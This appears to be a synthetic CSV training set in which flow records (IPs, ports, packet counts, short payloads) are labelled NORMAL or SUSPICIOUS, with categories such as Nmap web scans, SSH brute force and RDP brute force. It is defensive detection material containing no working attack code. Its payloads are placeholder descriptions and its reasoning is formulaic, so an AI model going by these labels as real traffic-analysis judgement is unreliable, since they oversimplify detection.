instruction,input,output
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""185.33.44.21"", ""Destination IP"": ""192.168.1.150"", ""Source Port"": 51234, ""Destination Port"": 80, ""Flow Key"": ""185.33.44.21->192.168.1.150"", ""Timestamp"": ""2024-10-24T17:43:00.123456"", ""Flow Data"": {""packets"": 400, ""bytes"": 35000, ""protocol"": ""TCP""}, ""Payload"": ""GET /wp-admin HTTP/1.1\r\nUser-Agent: Nmap""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Web Application Scan"", ""reasons"": [""Known scanning behavior"", ""Attempt to access wp-admin"", ""Nmap user agent detected""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.210"", ""Destination IP"": ""8.8.8.8"", ""Source Port"": 49157, ""Destination Port"": 53, ""Flow Key"": ""192.168.1.210->8.8.8.8"", ""Timestamp"": ""2024-10-24T17:44:00.234567"", ""Flow Data"": {""packets"": 2, ""bytes"": 140, ""protocol"": ""UDP""}, ""Payload"": ""DNS query for weather.api.com""}","{""decision"": ""NORMAL"", ""category"": ""DNS Query"", ""reasons"": [""Standard DNS lookup"", ""Known DNS server"", ""Expected packet size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""203.44.56.13"", ""Destination IP"": ""192.168.1.110"", ""Source Port"": 60001, ""Destination Port"": 22, ""Flow Key"": ""203.44.56.13->192.168.1.110"", ""Timestamp"": ""2024-10-24T17:45:00.123456"", ""Flow Data"": {""packets"": 1500, ""bytes"": 85000, ""protocol"": ""TCP""}, ""Payload"": ""SSH brute force attempt""}","{""decision"": ""SUSPICIOUS"", ""category"": ""SSH Brute Force"", ""reasons"": [""High number of SSH attempts"", ""External IP targeting SSH"", ""Known brute force pattern""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.20"", ""Destination IP"": ""10.0.0.8"", ""Source Port"": 49200, ""Destination Port"": 3306, ""Flow Key"": ""192.168.1.20->10.0.0.8"", ""Timestamp"": ""2024-10-24T17:46:00.234567"", ""Flow Data"": {""packets"": 8, ""bytes"": 1100, ""protocol"": ""TCP""}, ""Payload"": ""SELECT * FROM employees WHERE role = 'manager';""}","{""decision"": ""NORMAL"", ""category"": ""SQL Query"", ""reasons"": [""Internal database query"", ""Standard packet size"", ""Valid SQL syntax""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""103.45.88.99"", ""Destination IP"": ""192.168.1.180"", ""Source Port"": 59999, ""Destination Port"": 80, ""Flow Key"": ""103.45.88.99->192.168.1.180"", ""Timestamp"": ""2024-10-24T17:47:00.345678"", ""Flow Data"": {""packets"": 500, ""bytes"": 45000, ""protocol"": ""TCP""}, ""Payload"": ""GET /login HTTP/1.1\r\nUser-Agent: Nmap""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Web Application Scan"", ""reasons"": [""Nmap scanning detected"", ""Login page accessed"", ""External IP involved""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.150"", ""Destination IP"": ""8.8.8.8"", ""Source Port"": 49158, ""Destination Port"": 53, ""Flow Key"": ""192.168.1.150->8.8.8.8"", ""Timestamp"": ""2024-10-24T17:48:00.456789"", ""Flow Data"": {""packets"": 2, ""bytes"": 120, ""protocol"": ""UDP""}, ""Payload"": ""DNS query for weather.com""}","{""decision"": ""NORMAL"", ""category"": ""DNS Query"", ""reasons"": [""Standard DNS request"", ""Google DNS server"", ""Expected packet size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""185.22.13.41"", ""Destination IP"": ""192.168.1.210"", ""Source Port"": 54444, ""Destination Port"": 3389, ""Flow Key"": ""185.22.13.41->192.168.1.210"", ""Timestamp"": ""2024-10-24T17:49:00.567890"", ""Flow Data"": {""packets"": 1500, ""bytes"": 100000, ""protocol"": ""TCP""}, ""Payload"": ""RDP brute force attempt""}","{""decision"": ""SUSPICIOUS"", ""category"": ""RDP Brute Force"", ""reasons"": [""Multiple RDP attempts"", ""External IP involved"", ""Known brute force behavior""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.55"", ""Destination IP"": ""10.0.0.7"", ""Source Port"": 50001, ""Destination Port"": 443, ""Flow Key"": ""192.168.1.55->10.0.0.7"", ""Timestamp"": ""2024-10-24T17:50:00.678901"", ""Flow Data"": {""packets"": 10, ""bytes"": 1300, ""protocol"": ""TCP""}, ""Payload"": ""GET /api/metrics HTTP/1.1\r\nHost: internalapi.local""}","{""decision"": ""NORMAL"", ""category"": ""API Health Check"", ""reasons"": [""Internal API health check"", ""Expected packet size"", ""Standard HTTPS request""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""103.12.66.15"", ""Destination IP"": ""192.168.1.175"", ""Source Port"": 60002, ""Destination Port"": 3389, ""Flow Key"": ""103.12.66.15->192.168.1.175"", ""Timestamp"": ""2024-10-24T17:51:00.789012"", ""Flow Data"": {""packets"": 1800, ""bytes"": 115000, ""protocol"": ""TCP""}, ""Payload"": ""RDP brute force attempt""}","{""decision"": ""SUSPICIOUS"", ""category"": ""RDP Brute Force"", ""reasons"": [""Excessive RDP connection attempts"", ""External IP"", ""Known brute force behavior""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.70"", ""Destination IP"": ""10.0.0.4"", ""Source Port"": 50300, ""Destination Port"": 443, ""Flow Key"": ""192.168.1.70->10.0.0.4"", ""Timestamp"": ""2024-10-24T17:52:00.890123"", ""Flow Data"": {""packets"": 12, ""bytes"": 1600, ""protocol"": ""TCP""}, ""Payload"": ""POST /api/v1/register HTTP/1.1\r\nHost: api.internal.local""}","{""decision"": ""NORMAL"", ""category"": ""API Registration"", ""reasons"": [""Internal API request"", ""Expected packet size"", ""Valid HTTPS communication""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""185.33.22.20"", ""Destination IP"": ""192.168.1.160"", ""Source Port"": 51235, ""Destination Port"": 80, ""Flow Key"": ""185.33.22.20->192.168.1.160"", ""Timestamp"": ""2024-10-24T17:53:00.123456"", ""Flow Data"": {""packets"": 600, ""bytes"": 55000, ""protocol"": ""TCP""}, ""Payload"": ""GET /admin HTTP/1.1\r\nUser-Agent: nmap""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Web Application Scan"", ""reasons"": [""Nmap user agent detected"", ""Admin page targeted"", ""External IP source""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.210"", ""Destination IP"": ""8.8.4.4"", ""Source Port"": 49159, ""Destination Port"": 53, ""Flow Key"": ""192.168.1.210->8.8.4.4"", ""Timestamp"": ""2024-10-24T17:54:00.234567"", ""Flow Data"": {""packets"": 2, ""bytes"": 130, ""protocol"": ""UDP""}, ""Payload"": ""DNS query for maps.api.com""}","{""decision"": ""NORMAL"", ""category"": ""DNS Query"", ""reasons"": [""Standard DNS request"", ""Google DNS server"", ""Expected payload size""]}"
